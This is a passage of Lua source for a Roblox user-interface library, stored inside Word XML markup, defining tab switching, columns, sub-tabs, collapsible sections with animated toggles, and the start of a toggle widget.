        <w:tab/>
        <w:tab/>
        <w:t>cfg.pages[#cfg.pages + 1] = setmetatable(data, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.pages[1].open_page()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.open_tab() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local selected_tab = self.selected_tab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if selected_tab then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if selected_tab[ 4 ] ~= items[ "tab_holder" ] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        self.items[ "global_fade" ].BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(self.items[ "global_fade" ], {BackgroundTransparency = 1}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        selected_tab[ 4 ].Size = dim2(1, -216, 1, -101)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(selected_tab[ 1 ], {BackgroundTransparency = 1})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(selected_tab[ 2 ], {ImageColor3 = rgb(72, 72, 73)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(selected_tab[ 3 ], {TextColor3 = rgb(72, 72, 73)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 4 ].Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 4 ].Parent = library[ "cache" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 5 ].Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    selected_tab[ 5 ].Parent = library[ "cache" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "button" ], {BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "icon" ], {ImageColor3 = themes.preset.accent})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "name" ], {TextColor3 = rgb(255, 255, 255)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "tab_holder" ], {Size = dim2(1, -196, 1, -81)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "tab_holder" ].Visible = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "tab_holder" ].Parent = self.items[ "main" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "multi_section_button_holder" ].Visible = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "multi_section_button_holder" ].Parent = self.items[ "multi_holder" ]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                self.selected_tab = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "icon" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "name" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "tab_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "multi_section_button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:close_element()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "button" ].MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open_tab()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if not self.selected_tab then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open_tab(true) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return unpack(cfg.pages)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:seperator(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {items = {}, name = properties.Name or properties.name or "General"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "name"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self.items[ "button_holder"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Position = dim2(0, 40,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 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                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;    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-- Miscellaneous </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function library:column(properties) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local cfg = {items = {}, size = properties.size or 1}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local items = cfg.items; do     </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "column" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = self[ "parent" ] or self.items["tab_parent"];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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, cfg.size,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PaddingBottom = dim(0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "column"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"column" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Padding = dim(0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FillDirection = Enum.FillDirection.Vertical;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end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function library:sub_tab(properties) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local cfg = {items = {}, order = properties.order or 0; size = properties.size or 1}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "tab_parent" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = self.items[ "tab" ];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Size = dim2(0,0,cfg.size,0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Visible = true;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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        VerticalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "tab_parent"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Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        --</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:section(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = properties.name or properties.Name or "section"; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                side = properties.side or properties.Side or "left";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = properties.default or properties.Default or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                size = properties.size or properties.Size or self.size or 0.5; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                icon = properties.icon or properties.Icon or "http://www.roblox.com/asset/?id=6022668898";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                fading_toggle = properties.fading or properties.Fading or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "column" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, cfg.size, -3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(25, 25, 29)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "outline"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"inline" ] = library:create( "Frame" , {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Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(22, 22, 24)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"inline"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"scrolling" ] = library:create( "ScrollingFrame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ScrollBarImageColor3 = rgb(44, 44, 46);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Active = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutomaticCanvasSize = Enum.AutomaticSize.Y;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ScrollBarThickness = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 1, -40);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 0, 0, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255);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CanvasSize = dim2(0, 0, 0, 0)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"elements" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "scrolling"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10, 0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -20,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"elements" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 10);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PaddingBottom = dim(0, 15);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "elements" ]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"button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = rgb(255, 255, 255);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AutoButtonColor = false;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Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -2, 0, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(19, 19, 21)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"UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border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"button"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"Icon" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ImageColor3 = themes.preset.accent;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Image = cfg.icon;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 10, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 22, 0, 22);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"Icon" ], "accent", "ImageColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "section_title"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rgb(255, 255, 255);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"button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 40, 0, -1);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"button"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0,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if cfg.fading_toggle then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "toggle"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vec2(1, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, -9, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 36, 0, 18);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rgb(58, 58, 62)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });  library:apply_theme(items[ "toggle" ], "accent", "BackgroundColor3");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"toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 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"toggle_outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(50, 50, 50)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });  library:apply_theme(items[ "toggle_outline" ], "accent", "BackgroundColor3");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"toggle_outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 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rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle_outline"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"toggle_circle" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle_outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 2, 0, 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 12, 0, 12);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(86, 86, 88)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"toggle_circle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 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"outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "fade" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 0.800000011920929;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";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BackgroundColor3 = rgb(0,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"fade" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.fading_toggle then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "button" ].MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.default = not cfg.default </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.toggle_section(cfg.default) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                function cfg.toggle_section(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(58, 58, 62)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_outline" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(50, 50, 50)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_circle" ], {BackgroundColor3 = bool and rgb(255, 255, 255) or rgb(86, 86, 88), Position = bool and dim2(1, -14, 0, 2) or dim2(0, 2, 0, 2)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "fade" ], {BackgroundTransparency = bool and 1 or 0.8}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:toggle(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local rand = math.random(1, 2) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                enabled = options.default or false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "Toggle",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                type = options.type and string.lower(options.type) or rand == 1 and "toggle" or "checkbox"; -- "toggle", "checkbox"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = options.default or false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                folding = options.folding or false, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "toggle"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"toggle"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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "info"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rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
